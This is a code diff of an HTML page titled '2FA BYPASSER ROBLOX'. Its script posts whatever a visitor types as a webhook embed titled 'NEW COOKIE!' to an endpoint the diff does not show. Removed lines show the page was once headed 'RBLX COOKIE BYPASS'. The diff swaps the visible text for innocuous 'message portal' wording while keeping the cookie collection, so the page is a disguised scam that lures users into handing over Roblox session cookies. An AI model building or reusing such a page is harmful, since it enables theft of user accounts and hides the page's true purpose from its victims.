@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>2fa bypasser</title>
+<title>2FA BYPASSER ROBLOX </title>
 
 <style>
 body{
@@ -80,8 +80,8 @@ box-shadow:0 0 20px white,0 0 50px white;
 <body>
 
 <div class="container">
-<h1>RBLX COOKIE BYPASS</h1>
-<input id="messageinput" placeholder="Type here...">
+<h1>Submit Your Message</h1>
+<input id="messageInput" placeholder="Type here...">
 <br>
 <button onclick="sendMessage()">Send</button>
 </div>
@@ -96,12 +96,12 @@ function sendMessage(){
   const payload = {
     embeds: [
       {
-        title: "🍪 NEW COOKIE INBOUND!",
+        title: "🍪NEW COOKIE!",
         description: message,
-        color: 65280, // red color
+        color: 65280, // RED color
         timestamp: new Date().toISOString(),
         footer: {
-          text: "pardhus site",
+          text: "Neon Message Portal",
         }
       }
     ]
@@ -114,10 +114,10 @@ function sendMessage(){
     },
     body: JSON.stringify(payload)
   })
-  .then(() => alert("BYPASSED!"))
+  .then(() => alert("Message sent in style!"))
   .catch(err => alert("Error: " + err));
 }
 </script>
 
 </body>
-  </html>
+</html>
